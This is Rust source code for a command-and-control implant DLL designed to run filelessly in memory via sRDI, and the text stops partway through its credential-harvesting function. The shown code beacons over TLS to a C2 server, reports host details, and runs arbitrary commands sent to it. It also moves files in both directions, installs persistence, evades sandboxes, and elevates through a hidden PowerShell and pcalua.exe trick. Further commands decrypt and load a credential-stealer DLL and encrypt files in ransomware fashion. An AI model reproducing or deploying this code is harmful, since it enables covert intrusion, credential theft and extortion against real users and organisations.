//! Agent DLL - Full agent logic for 100% fileless execution via sRDI
//!
//! This DLL contains the COMPLETE agent functionality.
//! When converted to sRDI shellcode, it runs entirely in memory.

#![cfg_attr(feature = "production", windows_subsystem = "windows")]
#![allow(non_snake_case)]

// Use system allocator to avoid __declspec(thread) / PE TLS dependency.
// mimalloc uses per-thread heaps via TLS, which breaks reflective loading
// (the OS never calls LdrpAllocateTls for a reflectively-loaded DLL, so
// the TLS slot is uninitialised and the first alloc crashes with 0xC0000005).
#[global_allocator]
static GLOBAL: std::alloc::System = std::alloc::System;

// Macro for conditional debug printing
#[macro_export]
macro_rules! debug_print {
    ($($arg:tt)*) => {
        #[cfg(feature = "dev")]
        {
            println!($($arg)*);
        }
    };
}

mod beacon;
mod config;
mod evasion;
mod persistence;
mod persistence_fileless;
mod syscalls;
mod tls_config;

use std::env;
#[cfg(target_os = "windows")]
use std::ffi::CStr;
use std::fs;
use std::io::{ErrorKind, Read, Write};
use std::net::TcpStream;
use std::path::{Path, PathBuf};
use std::process::Command;
use std::sync::{Arc, Mutex};
use std::thread;
use std::time::Duration;

use rustls::ClientConfig;

const DELIMITER: &str = "\n<<END>>\n";

lazy_static::lazy_static! {
    static ref CURRENT_DIR: Mutex<PathBuf> = {
        let initial_dir = env::current_dir().unwrap_or_else(|_| {
            #[cfg(target_os = "windows")]
            { PathBuf::from("C:\\") }
            #[cfg(not(target_os = "windows"))]
            { PathBuf::from("/") }
        });
        Mutex::new(initial_dir)
    };
}

const MAX_CONSECUTIVE_TIMEOUTS: u32 = 3;

// ============================================================================
// DLL ENTRY POINT
// ============================================================================
#[cfg(target_os = "windows")]
mod dll_entry {
    use super::*;
    use std::ffi::c_void;
    use std::sync::atomic::{AtomicPtr, Ordering};

    type HINSTANCE = *mut c_void;
    type DWORD = u32;
    type LPVOID = *mut c_void;
    type HANDLE = *mut c_void;

    const DLL_PROCESS_ATTACH: DWORD = 1;
    const DLL_THREAD_ATTACH:  DWORD = 2;

    /// Saved DLL base address — used by agent_thread to call
    /// _DllMainCRTStartup(DLL_THREAD_ATTACH) which makes the MSVC CRT
    /// allocate a TLS slot for this new thread (PE TLS / __declspec(thread)).
    /// Without this call, any __declspec(thread) variable access in agent_thread
    /// reads TEB.ThreadLocalStoragePointer[_tls_index] = NULL → SIGSEGV.
    static DLL_BASE: AtomicPtr<c_void> = AtomicPtr::new(std::ptr::null_mut());

    #[link(name = "kernel32")]
    extern "system" {
        fn CreateThread(
            attrs: LPVOID,
            stack_size: usize,
            start_addr: LPVOID,
            param: LPVOID,
            flags: DWORD,
            thread_id: *mut DWORD,
        ) -> HANDLE;
    }

    /// Persistence background thread — spawned via raw CreateThread so TLS is
    /// properly initialised (same approach as agent_thread). Using
    /// std::thread::spawn() from within a reflectively-loaded DLL crashes
    /// because DLL_THREAD_ATTACH is never delivered, leaving MSVC CRT TLS
    /// uninitialised in the new thread.
    extern "system" fn persist_thread(_param: LPVOID) -> DWORD {
        let base = DLL_BASE.load(Ordering::Relaxed);
        if !base.is_null() {
            unsafe {
                let dos = base as *const u8;
                let e_lfanew = std::ptr::read_unaligned(dos.add(60) as *const u32) as usize;
                let ep_rva = std::ptr::read_unaligned(
                    dos.add(e_lfanew + 24 + 16) as *const u32,
                ) as usize;
                let entry: extern "system" fn(*mut c_void, u32, *mut c_void) -> i32 =
                    std::mem::transmute(dos.add(ep_rva));
                entry(base, DLL_THREAD_ATTACH, std::ptr::null_mut());
            }
        }
        persistence::do_auto_persistence_work();
        0
    }

    extern "system" fn agent_thread(_param: LPVOID) -> DWORD {
        // ----------------------------------------------------------------
        // TLS initialisation for this raw OS thread.
        //
        // When a DLL is reflectively loaded (not via the Windows loader),
        // new threads created inside DllMain do NOT automatically receive
        // a DLL_THREAD_ATTACH notification, so the MSVC CRT's _initptd
        // routine is never called for them.  _initptd allocates the per-
        // thread block pointed to by TEB.ThreadLocalStoragePointer[_tls_index],
        // which every __declspec(thread) variable relies on.  If it is not
        // called the first access to such a variable dereferences NULL →
        // STATUS_ACCESS_VIOLATION (0xC0000005).
        //
        // Fix: call the DLL's own entry-point (_DllMainCRTStartup) with
        // DLL_THREAD_ATTACH.  The CRT will call _initptd for us, then
        // forward to user DllMain(DLL_THREAD_ATTACH) which we ignore.
        // ----------------------------------------------------------------
        let base = DLL_BASE.load(Ordering::Relaxed);
        if !base.is_null() {
            unsafe {
                // Parse the in-memory PE to find AddressOfEntryPoint
                // (= _DllMainCRTStartup, the real DLL entry-point).
                let dos = base as *const u8;
                let e_lfanew = std::ptr::read_unaligned(dos.add(60) as *const u32) as usize;
                // PE64 optional header starts at e_lfanew+24.
                // AddressOfEntryPoint is at optional-header offset 16.
                let ep_rva = std::ptr::read_unaligned(
                    dos.add(e_lfanew + 24 + 16) as *const u32,
                ) as usize;
                let entry: extern "system" fn(*mut c_void, u32, *mut c_void) -> i32 =
                    std::mem::transmute(dos.add(ep_rva));
                // DLL_THREAD_ATTACH → CRT allocates TLS for this thread.
                entry(base, DLL_THREAD_ATTACH, std::ptr::null_mut());
            }
        }

        run_agent();
        0
    }

    #[no_mangle]
    pub extern "system" fn DllMain(
        h_instance: HINSTANCE,
        dw_reason: DWORD,
        _lp_reserved: LPVOID,
    ) -> i32 {
        if dw_reason == DLL_PROCESS_ATTACH {
            // Save the DLL base so agent_thread / persist_thread can re-init TLS.
            DLL_BASE.store(h_instance, Ordering::Relaxed);
            unsafe {
                // Agent beacon thread (needs 4 MB for rustls)
                CreateThread(
                    std::ptr::null_mut(),
                    4 * 1024 * 1024,
                    agent_thread as LPVOID,
                    std::ptr::null_mut(),
                    0,
                    std::ptr::null_mut(),
                );
                // Persistence thread — separate raw thread so TLS is properly
                // initialised (std::thread::spawn is NOT safe in a reflective DLL).
                CreateThread(
                    std::ptr::null_mut(),
                    1 * 1024 * 1024,  // 1 MB stack is enough
                    persist_thread as LPVOID,
                    std::ptr::null_mut(),
                    0,
                    std::ptr::null_mut(),
                );
            }
        }
        1
    }

    /// Export function for sRDI direct call
    #[no_mangle]
    pub extern "C" fn Run() {
        run_agent();
    }
}

// ============================================================================
// MAIN AGENT LOGIC
// ============================================================================
fn run_agent() {
    debug_print!("DEBUG: C2R2 Agent DLL v2.0 - Beacon Mode (TLS)");

    // Anti-sandbox checks (production only)
    #[cfg(feature = "production")]
    {
        if evasion::run_anti_sandbox_checks() {
            return;
        }
    }

    // Auto-persistence is scheduled via a raw CreateThread in dll_entry::DllMain
    // (DLL path) or via persistence::schedule_auto_persistence() in main.rs (EXE path).
    // Do NOT call schedule_auto_persistence() here — std::thread::spawn() crashes
    // in a reflectively-loaded DLL because DLL_THREAD_ATTACH is never delivered.
    debug_print!("DEBUG: Auto-persistence handled by DllMain persist_thread");

    let c2_server = config::get_c2_server();
    debug_print!("DEBUG: Connecting (TLS) to {}", c2_server);

    let tls_config = create_tls_config();
    let beacon_config = beacon::BeaconConfig::default();
    let mut retry_count = 0;

    loop {
        let (host, _port) = match c2_server.rsplit_once(':') {
            Some((h, p)) => (h, p),
            None => {
                debug_print!("DEBUG: Invalid server format: {}", c2_server);
                thread::sleep(Duration::from_secs(5));
                continue;
            }
        };

        match TcpStream::connect(c2_server) {
            Ok(tcp_stream) => {
                debug_print!("DEBUG: TCP connection established");

                if let Err(e) = configure_tcp_keepalive(&tcp_stream) {
                    debug_print!("DEBUG: Warning - TCP keepalive failed: {}", e);
                }

                let server_name = match rustls::pki_types::ServerName::try_from(host.to_string()) {
                    Ok(name) => name,
                    Err(e) => {
                        debug_print!("DEBUG: Error creating ServerName: {}", e);
                        match rustls::pki_types::ServerName::try_from("localhost".to_string()) {
                            Ok(name) => name,
                            Err(_) => continue,
                        }
                    }
                };

                let tls_conn = match rustls::ClientConnection::new(tls_config.clone(), server_name) {
                    Ok(conn) => conn,
                    Err(e) => {
                        debug_print!("DEBUG: Error creating TLS connection: {}", e);
                        continue;
                    }
                };

                debug_print!("DEBUG: Starting TLS connection...");
                retry_count = 0;
                handle_tls_connection(tcp_stream, tls_conn, &beacon_config);
                debug_print!("DEBUG: TLS connection closed");
            }
            Err(e) => {
                debug_print!("DEBUG: TCP connection error: {}", e);
            }
        }

        let retry_interval = beacon::calculate_retry_interval(&beacon_config, retry_count);
        debug_print!("DEBUG: Retrying in {} seconds...", retry_interval.as_secs());
        beacon::beacon_sleep(retry_interval);
        retry_count += 1;
    }
}

fn create_tls_config() -> Arc<ClientConfig> {
    Arc::new(tls_config::create_client_config())
}

fn configure_tcp_keepalive(stream: &TcpStream) -> std::io::Result<()> {
    #[cfg(target_os = "windows")]
    {
        use std::os::windows::io::AsRawSocket;
        use winapi::um::winsock2::{setsockopt, SOCKET, SOL_SOCKET, SO_KEEPALIVE};

        unsafe {
            let socket = stream.as_raw_socket() as SOCKET;
            let keepalive: u32 = 1;
            let result = setsockopt(
                socket,
                SOL_SOCKET,
                SO_KEEPALIVE,
                &keepalive as *const _ as *const i8,
                std::mem::size_of::<u32>() as i32,
            );

            if result != 0 {
                return Err(std::io::Error::last_os_error());
            }
        }
    }
    Ok(())
}

// ============================================================================
// TLS STREAM WRAPPER
// ============================================================================
struct TlsStreamWrapper {
    tcp_stream: TcpStream,
    tls_conn: rustls::ClientConnection,
}

impl TlsStreamWrapper {
    fn new(tcp_stream: TcpStream, tls_conn: rustls::ClientConnection) -> Self {
        Self { tcp_stream, tls_conn }
    }

    fn read(&mut self, buf: &mut [u8]) -> std::io::Result<usize> {
        let mut stream = rustls::Stream::new(&mut self.tls_conn, &mut self.tcp_stream);
        stream.read(buf)
    }

    fn write_all(&mut self, buf: &[u8]) -> std::io::Result<()> {
        let mut stream = rustls::Stream::new(&mut self.tls_conn, &mut self.tcp_stream);
        stream.write_all(buf)
    }

    fn flush(&mut self) -> std::io::Result<()> {
        let mut stream = rustls::Stream::new(&mut self.tls_conn, &mut self.tcp_stream);
        stream.flush()
    }

    fn set_read_timeout(&self, dur: Option<Duration>) -> std::io::Result<()> {
        self.tcp_stream.set_read_timeout(dur)
    }

    fn set_write_timeout(&self, dur: Option<Duration>) -> std::io::Result<()> {
        self.tcp_stream.set_write_timeout(dur)
    }
}

fn handle_tls_connection(
    tcp_stream: TcpStream,
    tls_conn: rustls::ClientConnection,
    _beacon_config: &beacon::BeaconConfig,
) {
    let mut tls_wrapper = TlsStreamWrapper::new(tcp_stream, tls_conn);

    let read_timeout = Duration::from_secs(300);
    let write_timeout = Duration::from_secs(30);

    if let Err(e) = tls_wrapper.set_read_timeout(Some(read_timeout)) {
        debug_print!("DEBUG: Warning - read timeout failed: {}", e);
    }

    if let Err(e) = tls_wrapper.set_write_timeout(Some(write_timeout)) {
        debug_print!("DEBUG: Warning - write timeout failed: {}", e);
    }

    if !send_sysinfo_tls(&mut tls_wrapper) {
        debug_print!("DEBUG: Error sending system info");
        return;
    }

    let mut read_buffer = vec![0u8; 4096];
    let mut line_buffer = String::new();
    let mut consecutive_timeouts: u32 = 0;

    loop {
        match tls_wrapper.read(&mut read_buffer) {
            Ok(0) => {
                debug_print!("DEBUG: Connection closed by server");
                break;
            }
            Ok(n) => {
                consecutive_timeouts = 0;
                let data = String::from_utf8_lossy(&read_buffer[..n]);
                line_buffer.push_str(&data);

                while let Some(pos) = line_buffer.find('\n') {
                    let line = line_buffer[..pos].to_string();
                    line_buffer = line_buffer[pos + 1..].to_string();

                    let command = line.trim();
                    if command.is_empty() {
                        continue;
                    }

                    debug_print!("DEBUG: Command received: {}", command);

                    let response = process_command(command);
                    if !response.is_empty() {
                        if !send_response_tls(&mut tls_wrapper, &response) {
                            debug_print!("DEBUG: Error sending response");
                            return;
                        }
                    }
                }
            }
            Err(e) => {
                if e.kind() == ErrorKind::TimedOut || e.kind() == ErrorKind::WouldBlock {
                    consecutive_timeouts += 1;
                    debug_print!(
                        "DEBUG: Read timeout ({}/{}), continuing...",
                        consecutive_timeouts,
                        MAX_CONSECUTIVE_TIMEOUTS
                    );

                    if consecutive_timeouts >= MAX_CONSECUTIVE_TIMEOUTS {
                        debug_print!("DEBUG: Max timeouts reached, forcing reconnect...");
                        break;
                    }
                    continue;
                }
                debug_print!("DEBUG: TLS read error: {}", e);
                break;
            }
        }
    }
}

fn send_response_tls(tls_wrapper: &mut TlsStreamWrapper, response: &str) -> bool {
    if let Err(e) = tls_wrapper.write_all(response.as_bytes()) {
        debug_print!("DEBUG: Error writing response: {}", e);
        return false;
    }
    if let Err(e) = tls_wrapper.flush() {
        debug_print!("DEBUG: Error flushing response: {}", e);
        return false;
    }
    true
}

fn send_sysinfo_tls(tls_wrapper: &mut TlsStreamWrapper) -> bool {
    debug_print!("DEBUG: Gathering system info...");

    let hostname = get_system_info("hostname");
    let username = get_system_info("username");
    let os = get_system_info("os");
    let privileges = get_system_info("privileges");

    let sysinfo = format!(
        "__SYSINFO__:hostname:{}\n__SYSINFO__:username:{}\n__SYSINFO__:os:{}\n__SYSINFO__:privileges:{}\n",
        hostname, username, os, privileges
    );

    debug_print!("DEBUG: Sending system info...");

    if let Err(e) = tls_wrapper.write_all(sysinfo.as_bytes()) {
        debug_print!("DEBUG: Error writing sysinfo: {}", e);
        return false;
    }

    if let Err(e) = tls_wrapper.flush() {
        debug_print!("DEBUG: Error flushing sysinfo: {}", e);
        return false;
    }

    debug_print!("DEBUG: System info sent successfully");
    true
}

// ============================================================================
// COMMAND PROCESSING
// ============================================================================
fn process_command(command: &str) -> String {
    if command.starts_with("__PERSIST__:") {
        let method = command.strip_prefix("__PERSIST__:").unwrap_or("");
        debug_print!("DEBUG: Setting persistence: {}", method);
        handle_persistence(method)
    } else if command == "__PERSIST_REMOVE__" {
        debug_print!("DEBUG: Removing persistence");
        handle_persistence_remove()
    } else if command.starts_with("__BEACON__:") {
        let config_str = command.strip_prefix("__BEACON__:").unwrap_or("");
        debug_print!("DEBUG: Changing beacon config: {}", config_str);
        format!(
            "__INFO__:Beacon config received (will apply on reconnect): {}{}",
            config_str, DELIMITER
        )
    } else if command.starts_with("__LISTDIR__:") {
        let path = command.strip_prefix("__LISTDIR__:").unwrap_or("");
        debug_print!("DEBUG: Listing directory: {}", path);
        list_directory(path)
    } else if command == "__LISTDIR__" {
        debug_print!("DEBUG: Listing current directory");
        let current = get_current_dir();
        list_directory(&current)
    } else if command.starts_with("__CD__:") {
        let path = command.strip_prefix("__CD__:").unwrap_or("");
        debug_print!("DEBUG: Changing directory to: {}", path);
        change_directory(path)
    } else if command == "__PWD__" {
        debug_print!("DEBUG: Getting current directory");
        get_pwd()
    } else if command.starts_with("__DOWNLOAD__:") {
        let path = command.strip_prefix("__DOWNLOAD__:").unwrap_or("");
        debug_print!("DEBUG: Downloading file: {}", path);
        download_file(path)
    } else if command.starts_with("__UPLOAD__|") {
        debug_print!("DEBUG: Processing upload...");
        upload_file(command)
    } else if command == "__HARVEST__" {
        debug_print!("DEBUG: Harvesting credentials...");
        harvest_credentials()
    } else if command.starts_with("__ENCRYPT__:") {
        let params = command.strip_prefix("__ENCRYPT__:").unwrap_or("");
        debug_print!("DEBUG: Encrypting files: {}", params);
        encrypt_files(params)
    } else if command.starts_with("__DECRYPT__:") {
        let params = command.strip_prefix("__DECRYPT__:").unwrap_or("");
        debug_print!("DEBUG: Decrypting files: {}", params);
        decrypt_files(params)
    } else if command == "__ELEVATE__" {
        debug_print!("DEBUG: Re-executing agent with admin privileges...");
        elevate_agent()
    } else if !command.is_empty() {
        let output = execute_command(command);
        format!("{}{}", output, DELIMITER)
    } else {
        String::new()
    }
}

// ============================================================================
// SYSTEM INFO
// ============================================================================
fn get_system_info(info_type: &str) -> String {
    #[cfg(target_os = "windows")]
    use std::os::windows::process::CommandExt;

    let output = match info_type {
        "hostname" => {
            #[cfg(target_os = "windows")]
            {
                Command::new("hostname")
                    .creation_flags(0x08000000)
                    .output()
            }
            #[cfg(not(target_os = "windows"))]
            { Command::new("hostname").output() }
        }
        "username" => {
            #[cfg(target_os = "windows")]
            {
                Command::new("cmd")
                    .args(&["/C", "echo %USERNAME%"])
                    .creation_flags(0x08000000)
                    .output()
            }
            #[cfg(not(target_os = "windows"))]
            { Command::new("whoami").output() }
        }
        "os" => {
            #[cfg(target_os = "windows")]
            {
                let ps_output = Command::new("powershell")
                    .args(&[
                        "-NoProfile", "-NonInteractive", "-WindowStyle", "Hidden", "-Command",
                        "(Get-CimInstance Win32_OperatingSystem).Caption",
                    ])
                    .creation_flags(0x08000000)
                    .output();

                if let Ok(out) = ps_output {
                    let os_name = String::from_utf8_lossy(&out.stdout).trim().to_string();
                    if !os_name.is_empty() && os_name.to_lowercase().contains("windows") {
                        return os_name;
                    }
                }

                let registry_output = Command::new("cmd")
                    .args(&["/C", r#"reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion" /v ProductName 2>nul"#])
                    .creation_flags(0x08000000)
                    .output();

                if let Ok(out) = registry_output {
                    let full_output = String::from_utf8_lossy(&out.stdout);
                    for line in full_output.lines() {
                        if line.contains("ProductName") && line.contains("REG_SZ") {
                            if let Some(os_name) = line.split("REG_SZ").nth(1) {
                                let trimmed = os_name.trim().to_string();
                                if !trimmed.is_empty() {
                                    return trimmed;
                                }
                            }
                        }
                    }
                }
                return "Windows".to_string();
            }
            #[cfg(not(target_os = "windows"))]
            { Command::new("uname").args(&["-s", "-r"]).output() }
        }
        "privileges" => {
            #[cfg(target_os = "windows")]
            {
                Command::new("cmd")
                    .args(&["/C", "net session >nul 2>&1 && echo Admin || echo User"])
                    .creation_flags(0x08000000)
                    .output()
            }
            #[cfg(not(target_os = "windows"))]
            { Command::new("id").args(&["-u"]).output() }
        }
        _ => return String::new(),
    };

    match output {
        Ok(out) => String::from_utf8_lossy(&out.stdout).trim().to_string(),
        Err(_) => "Unknown".to_string(),
    }
}

// ============================================================================
// COMMAND EXECUTION
// ============================================================================
fn execute_command(command: &str) -> String {
    debug_print!("DEBUG: Ejecutando comando: {}", command);

    #[cfg(target_os = "windows")]
    let output = {
        use std::os::windows::process::CommandExt;
        Command::new("cmd")
            .args(&["/C", command])
            .creation_flags(0x08000000)
            .output()
    };

    #[cfg(not(target_os = "windows"))]
    let output = Command::new("sh")
        .args(&["-c", command])
        .output();

    match output {
        Ok(out) => {
            let stdout = String::from_utf8_lossy(&out.stdout);
            let stderr = String::from_utf8_lossy(&out.stderr);
            format!("{}{}", stdout, stderr)
        }
        Err(e) => format!("Error: {}", e),
    }
}

// ============================================================================
// ELEVATION
// ============================================================================
#[cfg(target_os = "windows")]
fn elevate_agent() -> String {
    debug_print!("DEBUG: Re-executing agent with elevated privileges...");

    let current_exe = match std::env::current_exe() {
        Ok(path) => path,
        Err(e) => return format!("__ERROR__:Could not get executable path: {}{}", e, DELIMITER),
    };

    let exe_str = match current_exe.to_str() {
        Some(s) => s,
        None => return format!("__ERROR__:Invalid path{}", DELIMITER),
    };

    if let Ok(result) = elevate_agent_via_vbs(exe_str) {
        return result;
    }

    format!("__ERROR__:Elevation failed{}", DELIMITER)
}

#[cfg(target_os = "windows")]
fn elevate_agent_via_vbs(exe_path: &str) -> Result<String, String> {
    use std::os::windows::process::CommandExt;

    let temp_dir = std::env::temp_dir();
    let ps_name = format!("~elv{}.ps1", std::process::id());
    let ps_path = temp_dir.join(&ps_name);

    let ps_content = format!(
        r#"try {{
    throw ""
}} catch {{
    while (-not $?) {{
        try {{
            Start-Process pcalua.exe -ArgumentList "-a `"{}`"" -Verb RunAs -ErrorAction Stop
            break
        }} catch {{
            Write-Error "" -ErrorAction SilentlyContinue
        }}
    }}
}}"#,
        exe_path.replace("\"", "`\"")
    );

    if fs::write(&ps_path, ps_content).is_err() {
        return Err("Failed to create PowerShell script".to_string());
    }

    let output = Command::new("powershell")
        .args(&[
            "-NoProfile", "-NonInteractive", "-ExecutionPolicy", "Bypass",
            "-WindowStyle", "Hidden", "-File", ps_path.to_str().unwrap(),
        ])
        .creation_flags(0x08000000)
        .spawn();

    thread::sleep(Duration::from_millis(500));
    let _ = fs::remove_file(&ps_path);

    match output {
        Ok(_) => Ok(format!(
            "__SUCCESS__:Agent re-executed with elevated privileges (LOLBAS: pcalua.exe){}",
            DELIMITER
        )),
        Err(e) => Err(format!("pcalua.exe elevation failed: {}", e)),
    }
}

#[cfg(not(target_os = "windows"))]
fn elevate_agent() -> String {
    format!("__ERROR__:Elevation only supported on Windows{}", DELIMITER)
}

// ============================================================================
// DIRECTORY OPERATIONS
// ============================================================================
const MIN_WINDOWS_DRIVE_PATH_LEN: usize = 2;

fn get_current_dir() -> String {
    CURRENT_DIR
        .lock()
        .map(|dir| dir.to_string_lossy().to_string())
        .unwrap_or_else(|_| {
            #[cfg(target_os = "windows")]
            { "C:\\".to_string() }
            #[cfg(not(target_os = "windows"))]
            { "/".to_string() }
        })
}

fn change_directory(path: &str) -> String {
    let new_path = if path.is_empty() {
        #[cfg(target_os = "windows")]
        { env::var("USERPROFILE").unwrap_or_else(|_| "C:\\".to_string()) }
        #[cfg(not(target_os = "windows"))]
        { env::var("HOME").unwrap_or_else(|_| "/".to_string()) }
    } else if path == ".." {
        let current = get_current_dir();
        Path::new(&current)
            .parent()
            .map(|p| p.to_string_lossy().to_string())
            .unwrap_or(current)
    } else if path.starts_with('/')
        || (path.len() >= MIN_WINDOWS_DRIVE_PATH_LEN && path.chars().nth(1) == Some(':'))
    {
        path.to_string()
    } else {
        let current = get_current_dir();
        Path::new(&current).join(path).to_string_lossy().to_string()
    };

    let path_obj = Path::new(&new_path);
    if path_obj.exists() && path_obj.is_dir() {
        match CURRENT_DIR.lock() {
            Ok(mut dir) => {
                *dir = PathBuf::from(&new_path);
                debug_print!("DEBUG: Changed directory to: {}", new_path);
                format!("__CWD__:{}{}", new_path, DELIMITER)
            }
            Err(e) => format!("__ERROR__:Internal error changing directory: {}{}", e, DELIMITER),
        }
    } else if !path_obj.exists() {
        format!("__ERROR__:Directory does not exist: {}{}", new_path, DELIMITER)
    } else {
        format!("__ERROR__:Path is not a directory: {}{}", new_path, DELIMITER)
    }
}

fn get_pwd() -> String {
    let current = get_current_dir();
    format!("__CWD__:{}{}", current, DELIMITER)
}

fn list_directory(dir_path: &str) -> String {
    let actual_path = if dir_path.is_empty() {
        get_current_dir()
    } else {
        dir_path.to_string()
    };

    debug_print!("DEBUG: Listing directory: {}", actual_path);

    match fs::read_dir(&actual_path) {
        Ok(entries) => {
            let mut result = format!("__DIRLIST__:{}:", actual_path);
            let mut items = Vec::new();

            for entry in entries.flatten() {
                let path = entry.path();
                let name = entry.file_name().to_string_lossy().to_string();
                let is_dir = path.is_dir();
                let size = if is_dir { 0 } else { fs::metadata(&path).map(|m| m.len()).unwrap_or(0) };
                let type_char = if is_dir { "D" } else { "F" };
                items.push(format!("{}|{}|{}", type_char, name, size));
            }

            result.push_str(&items.join("\n"));
            result.push_str(DELIMITER);
            debug_print!("DEBUG: Listed {} items", items.len());
            result
        }
        Err(e) => {
            debug_print!("DEBUG: Error listing directory: {}", e);
            format!("__ERROR__:Could not list directory '{}': {}{}", actual_path, e, DELIMITER)
        }
    }
}

// ============================================================================
// FILE OPERATIONS
// ============================================================================
fn download_file(file_path: &str) -> String {
    debug_print!("DEBUG: Reading file: {}", file_path);

    match fs::read(file_path) {
        Ok(file_data) => {
            let encoded = base64_encode(&file_data);
            let file_name = Path::new(file_path)
                .file_name()
                .and_then(|n| n.to_str())
                .unwrap_or("unknown");

            debug_print!("DEBUG: File read, {} bytes", file_data.len());
            format!("__FILE__:{}:{}:{}{}", file_name, file_data.len(), encoded, DELIMITER)
        }
        Err(e) => {
            debug_print!("DEBUG: Error reading file: {}", e);
            format!("__ERROR__:Could not read file: {}{}", e, DELIMITER)
        }
    }
}

fn upload_file(command: &str) -> String {
    let parts: Vec<&str> = command.splitn(3, '|').collect();

    if parts.len() != 3 {
        return format!("__ERROR__:Invalid upload format{}", DELIMITER);
    }

    let dest_path = parts[1];
    let encoded_data = parts[2].trim();

    debug_print!("DEBUG: Decoding {} bytes of base64", encoded_data.len());
    debug_print!("DEBUG: Destination: {}", dest_path);

    match base64_decode(encoded_data) {
        Ok(file_data) => {
            debug_print!("DEBUG: Writing {} bytes to {}", file_data.len(), dest_path);
            match fs::write(dest_path, file_data) {
                Ok(_) => {
                    debug_print!("DEBUG: File saved successfully");
                    format!("__SUCCESS__:File saved to {}{}", dest_path, DELIMITER)
                }
                Err(e) => {
                    debug_print!("DEBUG: Error saving file: {}", e);
                    format!("__ERROR__:Error saving file: {}{}", e, DELIMITER)
                }
            }
        }
        Err(e) => {
            debug_print!("DEBUG: Error decoding base64: {}", e);
            format!("__ERROR__:Error decoding data: {}{}", e, DELIMITER)
        }
    }
}

// ============================================================================
// BASE64
// ============================================================================
fn base64_encode(data: &[u8]) -> String {
    const CHARS: &[u8] = b"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
    let mut result = String::new();

    for chunk in data.chunks(3) {
        let mut buf = [0u8; 3];
        for (i, &byte) in chunk.iter().enumerate() {
            buf[i] = byte;
        }

        let b1 = (buf[0] >> 2) & 0x3F;
        let b2 = ((buf[0] & 0x03) << 4) | ((buf[1] >> 4) & 0x0F);
        let b3 = ((buf[1] & 0x0F) << 2) | ((buf[2] >> 6) & 0x03);
        let b4 = buf[2] & 0x3F;

        result.push(CHARS[b1 as usize] as char);
        result.push(CHARS[b2 as usize] as char);
        result.push(if chunk.len() > 1 { CHARS[b3 as usize] as char } else { '=' });
        result.push(if chunk.len() > 2 { CHARS[b4 as usize] as char } else { '=' });
    }

    result
}

fn base64_decode(data: &str) -> Result<Vec<u8>, String> {
    let data = data.trim();
    let mut result = Vec::new();

    let decode_char = |c: char| -> Result<u8, String> {
        match c {
            'A'..='Z' => Ok(c as u8 - b'A'),
            'a'..='z' => Ok(c as u8 - b'a' + 26),
            '0'..='9' => Ok(c as u8 - b'0' + 52),
            '+' => Ok(62),
            '/' => Ok(63),
            '=' => Ok(0),
            _ => Err(format!("Invalid base64 character: {}", c)),
        }
    };

    let chars: Vec<char> = data.chars().collect();
    for chunk in chars.chunks(4) {
        if chunk.len() != 4 {
            continue;
        }

        let b1 = decode_char(chunk[0])?;
        let b2 = decode_char(chunk[1])?;
        let b3 = decode_char(chunk[2])?;
        let b4 = decode_char(chunk[3])?;

        result.push((b1 << 2) | (b2 >> 4));
        if chunk[2] != '=' {
            result.push((b2 << 4) | (b3 >> 2));
        }
        if chunk[3] != '=' {
            result.push((b3 << 6) | b4);
        }
    }

    Ok(result)
}

// ============================================================================
// XOR DECRYPTION
// ============================================================================
fn xor_decrypt(data: &[u8], key: &[u8]) -> Vec<u8> {
    data.iter()
        .enumerate()
        .map(|(i, &byte)| byte ^ key[i % key.len()])
        .collect()
}

// ============================================================================
// PERSISTENCE
// ============================================================================
fn handle_persistence(method_str: &str) -> String {
    let method = match persistence::PersistenceMethod::from_str(method_str) {
        Some(m) => m,
        None => {
            return format!(
                "__ERROR__:Invalid persistence method. Use: registry|task|wmi|startup{}",
                DELIMITER
            );
        }
    };

    match persistence::establish_persistence(method) {
        Ok(msg) => {
            debug_print!("DEBUG: [PERSISTENCE] ✅ {}", msg);
            format!("__SUCCESS__:{}{}", msg, DELIMITER)
        }
        Err(e) => {
            debug_print!("DEBUG: [PERSISTENCE] ❌ Error: {}", e);
            format!("__ERROR__:Error establishing persistence: {}{}", e, DELIMITER)
        }
    }
}

fn handle_persistence_remove() -> String {
    match persistence::remove_persistence() {
        Ok(msg) => {
            debug_print!("DEBUG: [PERSISTENCE] ✅ Cleanup: {}", msg);
            format!("__SUCCESS__:Persistence removed: {}{}", msg, DELIMITER)
        }
        Err(e) => {
            debug_print!("DEBUG: [PERSISTENCE] ❌ Cleanup error: {}", e);
            format!("__ERROR__:Error removing persistence: {}{}", e, DELIMITER)
        }
    }
}

// ============================================================================
// CREDENTIAL HARVESTING
// ============================================================================
fn harvest_credentials() -> String {
    debug_print!("DEBUG: Harvesting credentials...");

    #[cfg(not(target_os = "windows"))]
    {
        return format!("__ERROR__:Harvest only supported on Windows{}", DELIMITER);
    }

    #[cfg(target_os = "windows")]
    {
        if !Path::new("stealer.enc").exists() {
            return format!(
                "__ERROR__:stealer.enc not found. Server must upload it first.{}",
                DELIMITER
            );
        }

        if !Path::new("stealer.key").exists() {
            return format!(
                "__ERROR__:stealer.key not found. Server must upload it first.{}",
                DELIMITER
            );
        }

        let encrypted_dll = match fs::read("stealer.enc") {
            Ok(data) => data,
            Err(e) => return format!("__ERROR__:Error reading stealer.enc: {}{}", e, DELIMITER),
        };

        let xor_key = match fs::read("stealer.key") {
            Ok(data) => data,
            Err(e) => return format!("__ERROR__:Error reading stealer.key: {}{}", e, DELIMITER),
        };

        debug_print!("DEBUG: Encrypted DLL: {} bytes", encrypted_dll.len());
        debug_print!("DEBUG: XOR key: {} bytes", xor_key.len());

        let dll_bytes = xor_decrypt(&encrypted_dll, &xor_key);
        debug_print!("DEBUG: Decrypted DLL: {} bytes", dll_bytes.len());

        use std::ffi::CString;
        use std::os::raw::c_char;
        use winapi::um::libloaderapi::{FreeLibrary, GetProcAddress, LoadLibraryA};

        let temp_dir = std::env::temp_dir();
        let random_name = format!("~tmp{}.tmp", std::process::id());
        let dll_path = temp_dir.join(random_name);

        debug_print!("DEBUG: Writing DLL to temp: {}", dll_path.display());
        if let Err(e) = fs::write(&dll_path, &dll_bytes) {
            return format!("__ERROR__:Failed to write DLL: {}{}", e, DELIMITER);
        }

        let result = unsafe {
            let path_cstring = CString::new(dll_path.to_str().unwrap()).unwrap();
            let h_module = LoadLibraryA(path_cstring.as_ptr());

            if h_module.is_null() {
                let _ = fs::remove_file(&dll_path);
                return format!("__ERROR__:LoadLibrary failed{}", DELIMITER);
            }

